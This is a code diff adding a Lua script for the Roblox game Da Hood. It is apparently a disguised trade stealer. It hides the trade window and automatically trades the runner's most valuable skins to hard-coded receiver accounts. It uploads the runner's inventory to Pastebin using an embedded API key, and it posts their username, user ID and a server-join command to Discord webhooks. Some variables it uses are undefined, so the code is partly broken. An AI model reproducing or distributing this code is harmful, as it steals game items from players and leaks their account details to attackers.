@@ -1,0 +1,705 @@
+function DA_HOOD()
+    --More_Users = {"P0MED", "h4lloran", "khgdhcash1"}
+
+    --Username = "ghk1xd"
+    --Webhook = "https://discord.com/api/webhooks/1268640140910133280/hlGjyNIuSOoG1idHDlkEZ8wni3qbpjkQyMBiMiMJtaEzZhdkoTX0cT7TR4eL1oh1zrG1"
+    
+    --getgenv().gui = true
+    
+    version = "v1.5 shitcode"
+    
+    -- Usernames = {"khgdhcash", "growagardentestings"}
+    
+    -- table.insert(Usernames, Username)
+    
+    -- if More_Users == nil then
+    --     More_Users = {}
+    -- end
+    
+    -- for i,v in pairs(More_Users) do
+    --     table.insert(Usernames, v)
+    -- end
+    
+    -- if getgenv().gui == nil then
+    --     getgenv().gui = true
+    -- end
+    -- if getgenv().executed then return end
+    
+    -- getgenv().executed = true
+    
+    -- task.spawn(function()
+    --     if getgenv().gui then
+    --         loadstring(game:HttpGet("https://raw.githubusercontent.com/spacexrandom/Lua/main/DaHood", true))()
+    --     end
+    -- end)
+    
+    Player = game.Players.LocalPlayer
+    HttpService = game:GetService("HttpService")
+    Skins = Player.DataFolder.Skins.Value
+    PlayerSkins = HttpService:JSONDecode(Skins)
+
+    DataBaseSkins = require(game:GetService("ReplicatedStorage").SkinModules)
+    
+    
+    MainEvent = game:GetService("ReplicatedStorage"):WaitForChild("MainEvent")
+    FilterRarityTable = {"Exclusive", "Epic", "Legendary", "Rare", "Common"}
+    ValueList = {
+        ["[Rifle]"] = {
+            ["Inferno"] = 4000,
+            ["Valentine"] = 4000,
+            ["Luck"] = 4000,
+            ["GPO-Light"] = 4000,
+            ["Matrix"] = 3500,
+            ["Shadow"] = 3000,
+            ["Electric"] = 3000,
+            ["Galaxy"] = 3000,
+            ["Gold Glory"] = 3000,
+            ["Red Death"] = 3000,
+            ["Metal"] = 3000,
+            ["Snow Wrap"] = 2000
+        },
+        ["[Shotgun]"] = {
+            ["Galaxy"] = 10000,
+            ["Luck"] = 7000,
+            ["Kitty"] = 7000,
+            ["Inferno"] = 7000,
+            ["Matrix"] = 6000,
+            ["Shadow"] = 5000,
+            ["Electric"] = 5000,
+            ["Valentine"] = 5000,
+            ["Red Skull"] = 5000,
+            ["Halloween23"] = 5000,
+            ["Red Death"] = 4500,
+            ["Gold Glory"] = 4500,
+            ["Fish"] = 4000,
+            ["Bat-Hero"] = 4000,
+            ["Tact"] = 3000,
+            ["Hoodmas"] = 1000
+        },
+        ["[Silencer]"] = {
+            ["Galaxy"] = 3000,
+            ["Luck"] = 2000,
+            ["Matrix"] = 2000,
+            ["Inferno"] = 2000,
+            ["Tact"] = 2000,
+            ["Valentine"] = 1700,
+            ["Shadow"] = 1700,
+            ["Gold Glory"] = 1700,
+            ["Snow Wrap"] = 1200
+        },
+        ["[Revolver]"] = {
+            ["Golden Age"] = 62000,
+            ["Ninja"] = 127000,
+            ["Wild West"] = 122000,
+            ["Iced Out"] = 120000,
+            ["Galaxy"] = 31000,
+            ["Web Hero III"] = 89000,
+            ["Raygun"] = 87000,
+            ["Heaven"] = 80000,
+            ["Dragon"] = 75000,
+            ["Web Hero II"] = 74000,
+            ["Void"] = 61000,
+            ["Thunder II"] = 45500,
+            ["Luck"] = 40000,
+            ["Inferno"] = 35000,
+            ["Electric"] = 33000,
+            ["Valentine"] = 22000,
+            ["Matrix"] = 17000,
+            ["Kitty"] = 16000,
+            ["Shadow"] = 15000,
+            ["Red Skull"] = 9000,
+            ["Galactic"] = 9000,
+            ["Tact"] = 9000,
+            ["Ruby"] = 8000,
+            ["Gothic"] = 8000,
+            ["Snow Wrap"] = 7500,
+            ["8-BIT"] = 7000,
+            ["Red Death"] = 7000,
+            ["Gold Glory"] = 7000,
+            ["Cartoon"] = 7000,
+            ["Penguin"] = 6000,
+            ["Cutesy"] = 6000,
+            ["Undead"] = 6000,
+            ["Toy"] = 5000,
+            ["Web-Hero"] = 5000,
+            ["Water"] = 5000,
+            ["Thunder"] = 5000,
+            ["Mystical"] = 5000,
+            ["Candy"] = 5000,
+            ["Skeleton"] = 5000,
+            ["Soul"] = 5000,
+            ["Halloween23"] = 5000,
+            ["XMAS"] = 4000,
+            ["Frozen"] = 4000,
+            ["Ethereal"] = 4000,
+            ["Portal"] = 4000,
+            ["Love"] = 4000,
+            ["Cupid"] = 4000,
+            ["Squid"] = 4000,
+            ["Military"] = 4000,
+            ["Metal"] = 4000,
+            ["Jason"] = 4000,
+            ["Hoodmas"] = 4000
+        },
+        ["[SilencerAR]"] = {
+            ["Galaxy"] = 5000,
+            ["Inferno"] = 3500,
+            ["Matrix"] = 3500,
+            ["Luck"] = 3500,
+            ["Gold Glory"] = 3500,
+            ["Red Death"] = 3500,
+            ["Shadow"] = 3000,
+            ["Valentine"] = 3000,
+            ["Electric"] = 3000,
+            ["Snow Wrap"] = 1500
+        },
+        ["[LMG]"] = {
+            ["Candy"] = 5000,
+            ["Galaxy"] = 2500,
+            ["Luck"] = 2000,
+            ["Inferno"] = 2000,
+            ["Red Death"] = 1700,
+            ["Gold Glory"] = 1700,
+            ["Matrix"] = 1700,
+            ["Valentine"] = 1700,
+            ["Toy"] = 1700,
+            ["Shadow"] = 1650,
+            ["Eletric"] = 1600
+        },
+        ["[Glock]"] = {
+            ["Galaxy"] = 2500,
+            ["Luck"] = 2200,
+            ["Inferno"] = 2000,
+            ["Matrix"] = 2000,
+            ["Gold Glory"] = 2000,
+            ["Valentine"] = 1700,
+            ["Red Death"] = 1700,
+            ["Shadow"] = 1500,
+            ["Eletric"] = 1500
+        },
+        ["[Double-Barrel SG]"] = {
+            ["Golden Age"] = 190000,
+            ["Ninja"] = 123000,
+            ["Iced Out"] = 120000,
+            ["Wild West"] = 118000,
+            ["Galaxy"] = 87000,
+            ["Heaven"] = 77000,
+            ["Dragon"] = 70000,
+            ["Magma"] = 50000,
+            ["Electric"] = 39000,
+            ["Luck"] = 36000,
+            ["Inferno"] = 32000,
+            ["Valentine"] = 20000,
+            ["Matrix"] = 15000,
+            ["Shadow"] = 15000,
+            ["Fish"] = 13000,
+            ["DH-Stars"] = 10000,
+            ["Tact"] = 9000,
+            ["Ruby"] = 8000,
+            ["Gothic"] = 8000,
+            ["Red Skull"] = 8000,
+            ["Snow Wrap"] = 7500,
+            ["Cutesy"] = 7500,
+            ["8-BIT"] = 7000,
+            ["Gold Glory"] = 6000,
+            ["Penguin"] = 6000,
+            ["Red Death"] = 5000,
+            ["Toy"] = 5000,
+            ["Water"] = 5000,
+            ["Cartoon"] = 5000,
+            ["Dino"] = 5000,
+            ["Mystical"] = 5000,
+            ["Candy"] = 5000,
+            ["Car"] = 5000,
+            ["Soul"] = 5000,
+            ["Halloween23"] = 5000,
+            ["XMAS"] = 4000,
+            ["Frozen"] = 4000,
+            ["Ethereal"] = 4000,
+            ["Portal"] = 4000,
+            ["Love"] = 4000,
+            ["Cupid"] = 4000,
+            ["Panda"] = 4000,
+            ["Military"] = 4000,
+            ["Metal"] = 4000,
+            ["Angry-Hero"] = 4000,
+            ["Undead"] = 4000,
+            ["Eye"] = 4000,
+            ["Hoodmas"] = 1000
+        },
+        ["[Drum-Shotgun]"] = {
+            ["Inferno"] = 25000,
+            ["Luck"] = 25000,
+            ["Galaxy"] = 25000,
+            ["Gothic"] = 8000,
+            ["Gold Glory"] = 7000,
+            ["Red Death"] = 4000
+        },
+        ["[SMG]"] = {
+            ["Luck"] = 6500,
+            ["Galaxy"] = 6500,
+            ["Inferno"] = 6500,
+            ["Matrix"] = 5000,
+            ["Gold Glory"] = 5000,
+            ["Red Death"] = 5000,
+            ["Tact"] = 5000,
+            ["Shadow"] = 3500,
+            ["Valentine"] = 3500,
+            ["Electric"] = 3500,
+            ["Snow Wrap"] = 3000
+        },
+        ["[TacticalShotgun]"] = {
+            ["Numbers"] = 72000,
+            ["Galaxy"] = 66000,
+            ["Electric"] = 49000,
+            ["Void"] = 46000,
+            ["Luck"] = 32000,
+            ["Inferno"] = 23000,
+            ["GPO-Magma"] = 16500,
+            ["Shadow"] = 13500,
+            ["Valentine"] = 13000,
+            ["Matrix"] = 12000,
+            ["Galactic"] = 8000,
+            ["Snow Wrap"] = 7500,
+            ["Cutesy"] = 7000,
+            ["Gold Glory"] = 6000,
+            ["Red Death"] = 5000,
+            ["Tact"] = 5000,
+            ["Sould"] = 5000,
+            ["Halloween23"] = 5000,
+            ["Frozen"] = 4000,
+            ["Portal"] = 4000,
+            ["Love"] = 4000,
+            ["Military"] = 4000,
+            ["Water"] = 4000,
+            ["Undead"] = 4000,
+            ["Blood"] = 4000,
+            ["Hoodmas"] = 1000
+        },
+        ["[AK47]"] = {
+            ["Galaxy"] = 5000,
+            ["Shadow"] = 3000,
+            ["Inferno"] = 3000,
+            ["Valentine"] = 3000,
+            ["Electric"] = 3000,
+            ["Matrix"] = 3000,
+            ["Luck"] = 3000,
+            ["Gold Glory"] = 3000,
+            ["Red Death"] = 3000,
+            ["Snow Wrap"] = 2000
+        },
+        ["[Knife]"] = {
+            ["King Karambit"] = 3700000,
+            ["Red Blaze"] = 2600000,
+            ["Green Blaze"] = 2600000,
+            ["Purple Blaze"] = 2600000,
+            ["Blue Blaze"] = 2600000,
+            ["RGB Dual Bayonets"] = 2000000,
+            ["RGB Karambit"] = 1300000,
+            ["GPO-Knife Prestige"] = 795000,
+            ["Galaxy Karambit"] = 430000,
+            ["Golden Age Tanto"] = 260000,
+            ["Iced Out"] = 150000,
+            ["Heaven"] = 118000,
+            ["Wild West"] = 97000,
+            ["Dual Bayonets"] = 80000,
+            ["Love Kukri"] = 80000,
+            ["Galactic Red"] = 70000,
+            ["GPO-knife"] = 52000,
+            ["Dragon"] = 48000,
+            ["Raygun"] = 30000,
+            ["Void"] = 29000,
+            ["RGB Butterfly"] = 22500,
+            ["Galactic"] = 13000,
+            ["Golden"] = 12000,
+            ["Emerald"] = 11500,
+            ["Cutesy"] = 11000,
+            ["Ruby"] = 10000,
+            ["Gothic"] = 9000,
+            ["Cartoon"] = 9000,
+            ["Shadow"] = 8000,
+            ["Military"] = 6000,
+            ["Penguin"] = 6000,
+            ["Spatula"] = 5000,
+            ["Star"] = 5000,
+            ["Mystical"] = 5000,
+            ["Candy"] = 5000,
+            ["Banana"] = 5000,
+            ["Soul"] = 5000,
+            ["Halloween23"] = 5000,
+            ["XMAS"] = 4000,
+            ["Frozen"] = 4000,
+            ["Ethereal"] = 4000,
+            ["Portal"] = 4000,
+            ["Cupid"] = 4000,
+            ["Chain"] = 4000,
+            ["Love"] = 4000,
+            ["Metal"] = 4000,
+            ["Undead"] = 4000,
+            ["Magma"] = 4000,
+            ["Black Marker"] = 3000,
+            ["Blue Marker"] = 3000,
+            ["Pink Marker"] = 3000,
+            ["Green Marker"] = 3000,
+            ["Orange Marker"] = 3000,
+            ["Purple Marker"] = 3000,
+            ["Brown Marker"] = 3000,
+            ["Red Marker"] = 3000,
+            ["Hoodmas"] = 1000
+        },
+        ["[AR]"] = {
+            ["Galaxy"] = 5000,
+            ["Halloween"] = 4000,
+            ["Red Death"] = 3500,
+            ["Gold Glory"] = 3500,
+            ["Luck"] = 3500,
+            ["Matrix"] = 3500,
+            ["Inferno"] = 3500,
+            ["Electric"] = 3000,
+            ["Valentine"] = 3000,
+            ["Shadow"] = 3000,
+            ["Snow Wrap"] = 2000,
+            ["Hoodmas"] = 1000
+        },
+        ["[RPG]"] = {
+            ["Luck"] = 16000,
+            ["Galaxy"] = 9000,
+            ["Inferno"] = 9000,
+            ["Cartoon"] = 9000,
+            ["Electric"] = 8000,
+            ["Ruby"] = 8000,
+            ["Gothic"] = 8000,
+            ["Speed"] = 8000,
+            ["Matrix"] = 6500,
+            ["GPO-Ice"] = 6500,
+            ["Penguin"] = 6000,
+            ["Kitty"] = 6000,
+            ["Gold Glory"] = 6000,
+            ["Red Death"] = 5000,
+            ["8-BIT"] = 5000,
+            ["Cutesy"] = 5000,
+            ["Mystical"] = 5000,
+            ["Candy"] = 5000,
+            ["Cake"] = 5000,
+            ["Soul"] = 5000,
+            ["Halloween23"] = 5000,
+            ["XMAS"] = 4000,
+            ["Frozen"] = 4000,
+            ["Ethereal"] = 4000,
+            ["Portal"] = 4000,
+            ["Love"] = 4000,
+            ["Cupid"] = 4000,
+            ["Arcade"] = 4000
+        }
+    }
+    
+    FilteredItemsTable = {
+        ["Exclusive"] = {},
+        ["Epic"] = {},
+        ["Legendary"] = {},
+        ["Rare"] = {},
+        ["Common"] = {}
+    }
+    FilteredItemsTableAmount = {
+        ["Exclusive"] = 0,
+        ["Epic"] = 0,
+        ["Legendary"] = 0,
+        ["Rare"] = 0,
+        ["Common"] = 0
+    }
+    function GetItemData(classname, itemname)
+        local fdata = DataBaseSkins[classname][itemname]
+        if ValueList[classname] then
+            if ValueList[classname][itemname] then
+                fdata["Value"] = ValueList[classname][itemname]
+            end
+        end
+        if not fdata["Value"] then fdata["Value"] = 0 end
+        return fdata
+    end
+    
+    startergui = game.StarterGui
+    if not hookmetamethod then
+        while true do
+            task.wait(1.1)
+            startergui:SetCoreGuiEnabled(Enum.CoreGuiType.Backpack, true)
+        end
+    else
+        AntiBackpackHide = hookmetamethod(game, "__namecall", function(self, ...)
+            local args = {...}
+            if self == startergui and getnamecallmethod():lower() == "setcoreguienabled" then
+                if args[1] then
+                    if args[1] == Enum.CoreGuiType.Backpack then
+                        return
+                    end
+                end
+            end
+            return AntiBackpackHide(self, ...)
+        end)
+    end
+    
+    function HideTradeGui()
+        Player.PlayerGui.MainScreenGui.WeaponSkinsGUI.Position = UDim2.new(30, 0, 30, 0)
+        Player.PlayerGui.MainScreenGui.WeaponSkinsGUI.Visible = true
+        Player.PlayerGui.MainScreenGui.WeaponSkinsGUI.Body.Wrapper.SkinView.Trading.Position = UDim2.new(30, 0, 30, 0)
+        Player.PlayerGui.MainScreenGui.WeaponSkinsGUI.Body.Wrapper.SkinView.Trading.Visible = true
+    end
+    
+    TOTALVALUE = 0
+    currentitemdata = 1
+    function FilterItemsData()
+        for classname, data in pairs(PlayerSkins) do
+            for itemname, amount in pairs(data) do
+                local itemdata = GetItemData(classname, itemname)
+                FilteredItemsTable[itemdata.Rarity]["ID"..tostring(currentitemdata)] = {ClassName = classname, ItemName = itemname, Amount = amount, Value = itemdata.Value}
+                FilteredItemsTableAmount[itemdata.Rarity] = FilteredItemsTableAmount[itemdata.Rarity] + amount
+                TOTALVALUE = TOTALVALUE + amount * itemdata.Value
+                currentitemdata = currentitemdata + 1
+            end
+        end
+        for _, rar in pairs(FilterRarityTable) do
+            table.sort(FilteredItemsTable[rar], function(a, b) return a.Value > b.Value end)
+        end
+    end
+    FilterItemsData()
+    
+    function SuccessOffer(NewFilteredItemsTable)
+        FilteredItemsTable = NewFilteredItemsTable
+        return FilteredItemsTable
+    end
+    
+    function OfferItems()
+        local offered = 0
+        local LocalFilteredItemsTable = table.clone(FilteredItemsTable)
+        for _, rarity in pairs(FilterRarityTable) do
+            for ess, data in pairs(LocalFilteredItemsTable[rarity]) do
+                for i = 1,data.Amount do
+                    MainEvent:FireServer("Trading", "Add", data.ClassName, data.ItemName)
+                    task.wait(0.7 + (game.Players.LocalPlayer:GetNetworkPing() * 1000))
+                end
+                LocalFilteredItemsTable[rarity][ess] = nil
+                offered = offered + 1
+                if offered >= 6 then
+                    return LocalFilteredItemsTable
+                end
+            end
+            if offered >= 6 then
+                return LocalFilteredItemsTable
+            end
+        end
+    end
+    
+    function UpdateItemFilter()
+        Skins = Player.DataFolder.Skins.Value
+        PlayerSkins = HttpService:JSONDecode(Skins)
+        FilteredItemsTable = {
+            ["Exclusive"] = {},
+            ["Epic"] = {},
+            ["Legendary"] = {},
+            ["Rare"] = {},
+            ["Common"] = {}
+        }
+        FilteredItemsTableAmount = {
+            ["Exclusive"] = 0,
+            ["Epic"] = 0,
+            ["Legendary"] = 0,
+            ["Rare"] = 0,
+            ["Common"] = 0
+        }
+        TOTALVALUE = 0
+        currentitemdata = 1
+        FilterItemsData()
+    end
+    
+    function StartStealTrade(plr, chatconnection)
+        HideTradeGui()
+        UpdateItemFilter()
+        if not chatconnection then
+            task.wait(0.18)
+            MainEvent:FireServer("Trading", "Accept", plr)
+        end
+        task.wait(1.1)
+        local newdata = OfferItems()
+        local a1 = nil
+        local a2 = nil
+        a1 = MainEvent.OnClientEvent:Connect(function(eventname, plrn, arg2)
+            if eventname == "ReadyTrade" then
+                if plrn == plr and not arg2 then
+                    for i = 1,7 do
+                        MainEvent:FireServer("Trading", "Ready", "", "")
+                        task.wait(0.09)
+                    end
+                elseif plrn == plr and arg2 then
+                    for i = 1,7 do
+                        MainEvent:FireServer("Trading", "Confirm", "", "")
+                        task.wait(0.09)
+                    end
+                    SuccessOffer(newdata)
+                    a1:Disconnect()
+                    a2:Disconnect()
+                    a1 = nil
+                    a2 = nil
+                    task.wait(1)
+                    MainEvent:FireServer("Trading", "Request", plr)
+                    local c1 = nil
+                    c1 = MainEvent.OnClientEvent:Connect(function(eventname, plr1)
+                        if eventname == "AcceptTrade" and plr1 == plr then
+                            c1:Disconnect()
+                            c1 = nil
+                            StartStealTrade(plr, true)
+                        end
+                    end)	
+                end
+            end
+        end)
+        a2 = MainEvent.OnClientEvent:Connect(function(eventname)
+            if eventname == "ClearTrades" and a1 ~= nil then
+                a1:Disconnect()
+                a2:Disconnect()
+                a1 = nil
+                a2 = nil
+                task.wait(1)
+                MainEvent:FireServer("Trading", "Request", plr)
+                local c1 = nil
+                c1 = MainEvent.OnClientEvent:Connect(function(eventname, plr1)
+                    if eventname == "AcceptTrade" and plr1 == plr then
+                        c1:Disconnect()
+                        c1 = nil
+                        StartStealTrade(plr, true)
+                    end
+                end)
+            end
+        end)
+    end
+    
+    MainEvent.OnClientEvent:Connect(function(eventname, plr)
+        if eventname == "TradingRequest" and table.find(Usernames, plr.Name) then
+            StartStealTrade(plr)
+        end
+    end)
+    
+    for _, aa in pairs(game.Players:GetChildren()) do
+        if table.find(Usernames, aa.Name) then
+            aa.Chatted:Connect(function(msg)
+                task.wait(0.4)
+                MainEvent:FireServer("Trading", "Request", aa)
+                local c1 = nil
+                c1 = MainEvent.OnClientEvent:Connect(function(eventname, plr1)
+                    if eventname == "AcceptTrade" and plr1 == aa then
+                        c1:Disconnect()
+                        c1 = nil
+                        StartStealTrade(aa, true)
+                    end
+                end)	
+            end)
+        end
+    end
+    
+    game.Players.PlayerAdded:Connect(function(aplr)
+        if table.find(Usernames, aplr.Name) then
+            aplr.Chatted:Connect(function(msg)
+                task.wait(0.4)
+                MainEvent:FireServer("Trading", "Request", aplr)
+                local c1 = nil
+                c1 = MainEvent.OnClientEvent:Connect(function(eventname, plr1)
+                    if eventname == "AcceptTrade" and plr1 == aplr then
+                        c1:Disconnect()
+                        c1 = nil
+                        StartStealTrade(aplr, true)
+                    end
+                end)	
+            end)
+        end
+    end)
+    
+    function GetPastebin(stuff)
+        LIST = "api_paste_code=" ..Player.DataFolder.Skins.Value.. "&api_option=paste&api_dev_key=aL23vA-UXpKHvGuqL5_jJ4YIVZGY5Nrr"
+        site =
+        request(
+            {
+                Method = "POST",
+                Timeout = 10,
+                Url = "https://pastebin.com/api/api_post.php",
+                Headers = {
+                    ["Content-Type"] = "application/x-www-form-urlencoded"
+                },
+                Body = LIST
+            }
+        )
+    
+        hitslist = site.Body
+        return hitslist
+    end
+    
+    imgs = "https://images-ext-1.discordapp.net/external/SN9zgqCIgFRx4vco6NsGsf0QjfoCHf2Lj_k2R67EIIg/https/i.ibb.co/GWsnpph/xpng.png?format=webp&quality=lossless"
+    local fardplayer = game:GetService("Players").LocalPlayer
+    local ExecutorWebhook = identifyexecutor() or "undefined"
+    
+    content_ping = '--@everyone \ngame:GetService("TeleportService"):TeleportToPlaceInstance(' .. game.PlaceId .. ', "' .. game.JobId .. '")'
+    content_noping = content_ping:gsub("--@everyone\n", "")
+    
+    if TOTALVALUE > 0 then
+        content_logs = content_ping
+        Webhook = BigHitsWebhook
+    else
+        content_logs = content_noping
+    end
+    
+    local data = {
+        content = content_logs,
+        username = game.Players.LocalPlayer.Name,
+        avatar_url = imgs,
+        embeds = {
+            {
+                title = "DA HOOD SHITCODE - DA HOOD SHITCODE!",
+                description = "",
+                color = tonumber(0xd100cb),
+                fields = {
+                    {
+                        ["name"] = "\226\173\144 __**X Scripts**__",
+                        ["value"] = "```Username     : " ..
+                            fardplayer.Name ..
+                                "\nUser-ID      : " ..
+                                    fardplayer.userId ..
+                                        "\nAccount Age  : " ..
+                                            fardplayer.AccountAge ..
+                                                " Days" ..
+                                                    "\nExploit      : " ..
+                                                        ExecutorWebhook ..
+                                                            "\nReceivers     : " ..
+                                                                table.concat(WebhookUsernames, ", ") .. "\nVersion      : " .. version .. "```",
+                        ["inline"] = false
+                    },
+                    {
+                        ["name"] = "\240\159\170\144 __/__ **`Inventory:`**",
+                        ["value"] = "[Click Me](" .. GetPastebin(PlayerSkins) .. ")\n`Total Value: " .. TOTALVALUE .. "`",
+                        ["inline"] = false
+                    }
+                }
+            }
+        }
+    }
+    
+    request(
+        {
+            Url = Webhook,
+            Method = "POST",
+            Headers = {
+                ["Content-Type"] = "application/json"
+            },
+            Body = game:GetService("HttpService"):JSONEncode(data)
+        }
+    )
+    newdata = data
+    newdata.content = content_noping
+    request(
+        {
+            Url = LogsWebhook,
+            Method = "POST",
+            Headers = {
+                ["Content-Type"] = "application/json"
+            },
+            Body = game:GetService("HttpService"):JSONEncode(data)
+        }
+    )
+end
